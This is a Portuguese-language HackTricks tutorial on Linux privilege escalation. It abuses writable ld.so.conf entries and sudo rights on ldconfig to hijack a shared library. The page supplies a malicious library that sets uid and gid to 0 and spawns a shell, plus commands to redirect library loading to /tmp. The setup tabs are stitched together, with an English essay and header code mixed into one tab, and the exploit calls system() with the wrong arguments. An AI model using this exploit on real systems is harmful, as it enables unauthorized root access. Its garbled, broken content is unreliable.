# Exemplo de exploração de privilégios ld.so

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Preparar o ambiente

Na seção a seguir, você pode encontrar o código dos arquivos que vamos usar para preparar o ambiente

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
    printf("Welcome to my amazing application!\n");
    vuln_func();
    return 0;
}
```
{% endtab %}

{% tab title="ld.so.conf Example" %}
# ld.so.conf Example

This file is used by the dynamic linker/loader (`ld-linux.so`) to determine the libraries that need to be loaded for a given executable. It contains a list of directories where shared libraries are located.

An attacker can modify this file to add a directory containing a malicious shared library. When a privileged program is executed, the dynamic linker/loader will load the malicious library, which can lead to privilege escalation.

To prevent this type of attack, ensure that the `ld.so.conf` file is owned by `root` and has the correct permissions (`644`). Additionally, only trusted directories should be added to the file.

Example `ld.so.conf` file:

```
# Begin /etc/ld.so.conf
/usr/local/lib
/opt/lib
/home/user/lib
# End /etc/ld.so.conf
```

In this example, the directories `/usr/local/lib`, `/opt/lib`, and `/home/user/lib` are trusted directories where shared libraries can be located.
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="ld.so.conf" %}
# ld.so.conf(5)
#
# This file contains a list of directories, in the order they are searched
# for libraries by the ld.so(8) and ld-linux.so(8) dynamic linkers.
#
# /usr/local/lib64 is the default location for locally installed shared
# libraries, and may be added to this file.
#
# See ld.so.conf(5) for details.

# Multiarch support
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu
/lib/i386-linux-gnu
/usr/lib/i386-linux-gnu

# Custom libraries
/opt/custom-libs/lib

# Include another configuration file
include /etc/ld.so.conf.d/*.conf
{% endtab %}

{% tab title="ldconfig" %}
# ldconfig - configure dynamic linker run-time bindings
#
# ldconfig creates the necessary links and cache to the most recent shared
# libraries found in the directories specified on the command line, in the
# file /etc/ld.so.conf, and in the trusted directories (/usr/lib and /lib).
#
# ldconfig checks the header and file names of the libraries it encounters
# when determining which versions should have their links updated.
#
# See ldconfig(8) for details.

/sbin/ldconfig.real "$@"
{% endtab %}

{% tab title="Makefile" %}
all:
    gcc -fPIC -shared -o libcustom.so libcustom.c
    cp libcustom.so /opt/custom-libs/lib/
    echo "/opt/custom-libs/lib" > /etc/ld.so.conf.d/custom-libs.conf
    ldconfig
clean:
    rm -f libcustom.so
    rm -f /opt/custom-libs/lib/libcustom.so
    rm -f /etc/ld.so.conf.d/custom-libs.conf
    ldconfig
{% endtab %}
```c
#include <stdio.h>

void vuln_func()
{
    puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **Crie** esses arquivos em sua máquina na mesma pasta
2. **Compile** a **biblioteca**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copie** `libcustom.so` para `/usr/lib`: `sudo cp libcustom.so /usr/lib` (privilégios de root)
4. **Compile** o **executável**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Verifique o ambiente

Verifique se _libcustom.so_ está sendo **carregada** de _/usr/lib_ e se você pode **executar** o binário.
```
$ ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
	
$ ./sharedvuln 
Welcome to my amazing application!
Hi
```
## Exploração

Neste cenário, vamos supor que **alguém criou uma entrada vulnerável** dentro de um arquivo em _/etc/ld.so.conf/_:
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
A pasta vulnerável é _/home/ubuntu/lib_ (onde temos acesso de escrita).\
**Baixe e compile** o seguinte código dentro desse caminho:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("/bin/sh",NULL,NULL);
}
```
Agora que **criamos a biblioteca maliciosa libcustom dentro do caminho mal configurado**, precisamos esperar por um **reinício** ou para que o usuário root execute **`ldconfig`** (_caso você possa executar esse binário como **sudo** ou ele tenha o **bit suid**, você poderá executá-lo sozinho_).

Uma vez que isso tenha acontecido, **verifique novamente** de onde o executável `sharevuln` está carregando a biblioteca `libcustom.so`:
```c
$ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffeee766000)
	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como você pode ver, ele está **carregando a biblioteca de `/home/ubuntu/lib`** e se algum usuário a executar, um shell será executado:
```c
$ ./sharedvuln 
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Observe que neste exemplo não escalamos privilégios, mas modificando os comandos executados e **esperando que o root ou outro usuário privilegiado execute o binário vulnerável**, seremos capazes de escalar privilégios.
{% endhint %}

### Outras configurações incorretas - Mesma vulnerabilidade

No exemplo anterior, simulamos uma configuração incorreta em que um administrador **definiu uma pasta não privilegiada dentro de um arquivo de configuração dentro de `/etc/ld.so.conf.d/`**.\
Mas existem outras configurações incorretas que podem causar a mesma vulnerabilidade, se você tiver **permissões de escrita** em algum **arquivo de configuração** dentro de `/etc/ld.so.conf.d`, na pasta `/etc/ld.so.conf.d` ou no arquivo `/etc/ld.so.conf`, você pode configurar a mesma vulnerabilidade e explorá-la.

## Explorar 2

**Suponha que você tenha privilégios sudo sobre `ldconfig`**.\
Você pode indicar ao `ldconfig` **onde carregar os arquivos de configuração**, então podemos aproveitar isso para fazer o `ldconfig` carregar pastas arbitrárias.\
Então, vamos criar os arquivos e pastas necessários para carregar "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Agora, como indicado no **exploit anterior**, **crie a biblioteca maliciosa dentro de `/tmp`**.\
E finalmente, vamos carregar o caminho e verificar de onde o binário está carregando a biblioteca:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007fffa2dde000)
	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como você pode ver, tendo privilégios sudo sobre `ldconfig`, você pode explorar a mesma vulnerabilidade.**

{% hint style="info" %}
Eu **não encontrei** uma maneira confiável de explorar essa vulnerabilidade se `ldconfig` estiver configurado com o **bit suid**. O seguinte erro aparece: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## Referências

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Máquina Dab em HTB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
